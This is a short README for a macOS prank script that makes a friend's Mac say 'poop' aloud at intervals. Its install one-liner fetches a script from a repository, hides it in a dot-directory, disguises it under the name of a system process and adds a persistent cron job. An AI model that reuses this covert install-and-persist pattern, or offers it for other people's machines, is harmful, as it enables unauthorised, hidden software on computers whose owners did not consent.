# 🪤 poop-virus.sh - harmless macOS prank

This script randomly says “poop” out loud every ~30 minutes. Install it on your friend's Mac for a lighthearted prank. 
- It runs silently in the background via `cron` using a stealthy directory.
- Installed in `~/.sysupdate`
- `poop-virus.sh` is renamed to sysd to blend in with system processes

---

## 🛠️ Installation (1-liner)

```bash
git clone https://github.com/nwoonet/misc.git && mkdir -p ~/.sysupdate && mv misc/poop-virus.sh ~/.sysupdate/sysd && chmod +x ~/.sysupdate/sysd && rm -rf misc && (crontab -l 2>/dev/null; echo "*/5 * * * * ~/.sysupdate/sysd") | crontab -
```

## Uninstall (1-liner)
```bash
crontab -l | grep -v sysupdate | crontab - && rm -rf ~/.sysupdate
```
